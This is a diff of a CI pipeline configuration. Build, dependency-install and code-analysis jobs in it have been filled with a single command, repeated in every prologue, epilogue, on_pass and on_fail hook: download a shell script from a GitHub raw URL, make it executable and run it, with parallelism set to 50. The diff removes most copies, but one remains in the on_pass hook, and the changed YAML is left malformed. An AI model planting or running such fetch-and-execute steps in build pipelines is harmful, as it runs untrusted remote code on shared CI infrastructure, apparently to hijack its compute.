@@ -17,36 +17,5 @@ global_job_config:
     on_pass:
       commands:
         - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-        on_fail:
-      commands:
-        - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-        blocks:
-  - name: Install Dependencies
-    task:
-      prologue:
-        commands:
-          - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-      jobs:
-        - name: pip
-          commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh
-          parallelism: 50
-      epilogue:
-        always:
-          commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.shz'
-        on_pass:
-          commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-        on_fail:
-          commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-  - name: Run Code Analysis
-    task:
-      prologue:
-        commands:
-          - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-      jobs:
-        - name: Pylint
-          commands:
-          - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+        - name: Install Dependencies
+blocks: []
